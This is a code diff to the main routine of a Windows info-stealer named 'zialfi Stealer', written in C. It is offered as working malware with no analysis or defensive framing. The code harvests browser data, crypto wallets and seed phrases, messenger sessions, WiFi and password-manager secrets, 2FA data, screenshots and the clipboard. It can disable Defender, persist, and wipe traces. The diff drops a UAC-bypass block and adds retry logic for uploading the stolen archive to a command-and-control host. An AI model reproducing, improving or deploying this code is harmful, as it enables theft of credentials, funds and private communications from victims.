@@ -316,19 +316,8 @@ int main(int argc, char *argv[]) {
 #ifdef ENABLE_DEFENDER_DISABLE
     mirage_disable_defender();
 #endif
-#ifdef ENABLE_UAC_BYPASS
-    if (!mirage_is_elevated()) {
-        char exe_path[MAX_PATH];
-        DWORD path_len2 = GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
-        if (path_len2 > 0 && path_len2 < sizeof(exe_path)) {
-            mirage_uac_bypass(exe_path);
-        }
-        ExitProcess(0);
-    }
-#endif
 
     dbg_printf("[*] zialfi Stealer (C11) starting...\n");
-    fflush(stdout);
 
     char tmpdir[MAX_PATH], local[MAX_PATH], roaming[MAX_PATH], output_dir[MAX_PATH];
     GetTempPathA(MAX_PATH, tmpdir);
@@ -344,7 +333,6 @@ int main(int argc, char *argv[]) {
     dbg_printf("[+] Local:  %s\n", local);
     dbg_printf("[+] Roaming: %s\n", roaming);
     dbg_printf("[+] Output: %s\n", output_dir);
-    fflush(stdout);
 
     int ok = mirage_syscall_resolve();
     if (ok) {
@@ -354,11 +342,10 @@ int main(int argc, char *argv[]) {
     } else {
         dbg_printf("[!] PEB walk failed — using fallback WinAPI\n");
     }
-    fflush(stdout);
 
 #ifdef ENABLE_CHROMIUM_STEALER
     /* App-Bound COM requires GUI session — skip fork in headless mode */
-    dbg_printf("[*] Chromium...\n"); fflush(stdout);
+    dbg_printf("[*] Chromium...\n");
     CollectResult chrome = collect_chromium(local, roaming);
     dbg_printf("[+] Chromium: %zu browsers\n", chrome.count);
     save_browser_data(output_dir, "chromium", &chrome);
@@ -366,7 +353,7 @@ int main(int argc, char *argv[]) {
 #endif
 
 #ifdef ENABLE_FIREFOX_STEALER
-    dbg_printf("[*] Firefox...\n"); fflush(stdout);
+    dbg_printf("[*] Firefox...\n");
     CollectResult ff = collect_firefox(roaming);
     dbg_printf("[+] Firefox: %zu browsers\n", ff.count);
     save_browser_data(output_dir, "firefox", &ff);
@@ -374,14 +361,14 @@ int main(int argc, char *argv[]) {
 #endif
 
 #ifdef ENABLE_WALLET_EXTENSIONS
-    dbg_printf("[*] Wallets...\n"); fflush(stdout);
+    dbg_printf("[*] Wallets...\n");
     CollectResult wallets = collect_wallets(local, roaming);
     dbg_printf("[+] Wallets: %zu\n", wallets.count);
     save_browser_data(output_dir, "wallets", &wallets);
     free_browser_data(&wallets);
 #endif
 
-    dbg_printf("[*] Messengers...\n"); fflush(stdout);
+    dbg_printf("[*] Messengers...\n");
     MessengerData messengers = collect_messengers(roaming, local);
     dbg_printf("[+] Discord: %zu, Telegram: %zu, Signal: %zu\n",
            messengers.discord.count, messengers.telegram.count, messengers.signal.count);
@@ -402,7 +389,7 @@ int main(int argc, char *argv[]) {
     free_messenger_data(&messengers);
 
 #ifdef ENABLE_SYSTEM_INFO
-    dbg_printf("[*] System info...\n"); fflush(stdout);
+    dbg_printf("[*] System info...\n");
     char sys_info[4096] = {0};
     mirage_collect_system_info(sys_info, sizeof(sys_info));
     {
@@ -416,7 +403,7 @@ int main(int argc, char *argv[]) {
 #ifdef ENABLE_SCREENSHOT
     char ss_path[MAX_PATH];
     snprintf(ss_path, sizeof(ss_path), "%s\\screenshot.bmp", output_dir);
-    dbg_printf("[*] Screenshot...\n"); fflush(stdout);
+    dbg_printf("[*] Screenshot...\n");
     if (screenshot_capture(ss_path) == 0)
         dbg_printf("[+] Screenshot: %s\n", ss_path);
     else
@@ -425,7 +412,7 @@ int main(int argc, char *argv[]) {
 
 #ifdef ENABLE_CLIPBOARD
     char clip_buf[4096] = {0};
-    dbg_printf("[*] Clipboard...\n"); fflush(stdout);
+    dbg_printf("[*] Clipboard...\n");
     int clip_len = clipboard_get_text(clip_buf, sizeof(clip_buf));
     if (clip_len > 0) {
         char clip_path[MAX_PATH];
@@ -443,7 +430,7 @@ int main(int argc, char *argv[]) {
 #endif
 
 #ifdef ENABLE_SEED_PHRASE_GRABBER
-    dbg_printf("[*] Seed phrase scan...\n"); fflush(stdout);
+    dbg_printf("[*] Seed phrase scan...\n");
     {
         char seed_buf[16384] = {0};
         if (seed_grabber_collect(seed_buf, sizeof(seed_buf)) == 0 && seed_buf[0]) {
@@ -455,7 +442,7 @@ int main(int argc, char *argv[]) {
 #endif
 
 #ifdef ENABLE_WIFI_PASSWORDS
-    dbg_printf("[*] WiFi passwords...\n"); fflush(stdout);
+    dbg_printf("[*] WiFi passwords...\n");
     {
         char wifi_buf[4096] = {0};
         mirage_collect_wifi_passwords(wifi_buf, sizeof(wifi_buf));
@@ -472,34 +459,33 @@ int main(int argc, char *argv[]) {
 #endif
 
 #ifdef ENABLE_FILE_GRABBER
-    dbg_printf("[*] File grabber...\n"); fflush(stdout);
+    dbg_printf("[*] File grabber...\n");
     int grabbed = grabber_collect(output_dir, 100);
     dbg_printf("[+] Grabbed %d files\n", grabbed);
 #endif
 
 #ifdef ENABLE_GAMING_STEAM
-    dbg_printf("[*] Gaming...\n"); fflush(stdout);
+    dbg_printf("[*] Gaming...\n");
     gaming_collect_all(output_dir);
 #endif
 
 #ifdef ENABLE_VPN_NORDVPN
-    dbg_printf("[*] VPN...\n"); fflush(stdout);
+    dbg_printf("[*] VPN...\n");
     int vpn_files = vpn_collect(output_dir);
     dbg_printf("[+] VPN: %d files\n", vpn_files);
 #endif
 
 #ifdef ENABLE_2FA_GOOGLE
-    dbg_printf("[*] 2FA...\n"); fflush(stdout);
+    dbg_printf("[*] 2FA...\n");
     twofa_collect(output_dir);
 #endif
 
 #ifdef ENABLE_PM_BITWARDEN
-    dbg_printf("[*] Password managers...\n"); fflush(stdout);
+    dbg_printf("[*] Password managers...\n");
     passman_collect(output_dir);
 #endif
 
     dbg_printf("[*] Done. Output: %s\n", output_dir);
-    fflush(stdout);
 
     /* ── Persistence ───────────────────────────────────────────── */
 #ifdef ENABLE_PERSISTENCE
@@ -514,6 +500,7 @@ int main(int argc, char *argv[]) {
 #endif
 
     /* ── C2 Exfil ──────────────────────────────────────────────── */
+    int exfil_ok = 0;
 #ifdef ENABLE_C2_EXFIL
     {
         size_t archive_len = 0;
@@ -523,8 +510,14 @@ int main(int argc, char *argv[]) {
             snprintf(metadata, sizeof(metadata),
                      "{\"host\":\"%s\",\"user\":\"%s\"}",
                      "unknown", getenv("USERNAME") ? getenv("USERNAME") : "unknown");
-            upload_log(C2_HOST, C2_PORT, C2_TOKEN,
-                       archive, archive_len, metadata);
+            for (int attempt = 0; attempt < 3 && !exfil_ok; attempt++) {
+                if (upload_log(C2_HOST, C2_PORT, C2_TOKEN,
+                               archive, archive_len, metadata) == 0) {
+                    exfil_ok = 1;
+                } else if (attempt < 2) {
+                    Sleep(2000);
+                }
+            }
             free(archive);
         }
     }
@@ -535,16 +528,24 @@ int main(int argc, char *argv[]) {
     temp_wipe_directory();
 #endif
 
-    /* ── Self-delete (last) ────────────────────────────────────── */
-#ifdef ENABLE_SELF_DELETE
-    self_delete_run();
-#else
-    /* Self-delete not enabled — remove the output directory manually */
+    /* ── Remove output dir (only if exfil OK, to avoid data loss) ── */
+#if !defined(ENABLE_C2_EXFIL) || defined(ZIALFI_TEST_MODE)
     {
         char del_path[MAX_PATH + 8];
         snprintf(del_path, sizeof(del_path), "rmdir /s /q \"%s\"", output_dir);
         WinExec(del_path, SW_HIDE);
     }
+#else
+    if (exfil_ok) {
+        char del_path[MAX_PATH + 8];
+        snprintf(del_path, sizeof(del_path), "rmdir /s /q \"%s\"", output_dir);
+        WinExec(del_path, SW_HIDE);
+    }
+#endif
+
+    /* ── Self-delete (last) ────────────────────────────────────── */
+#ifdef ENABLE_SELF_DELETE
+    self_delete_run();
 #endif
 
     return 0;
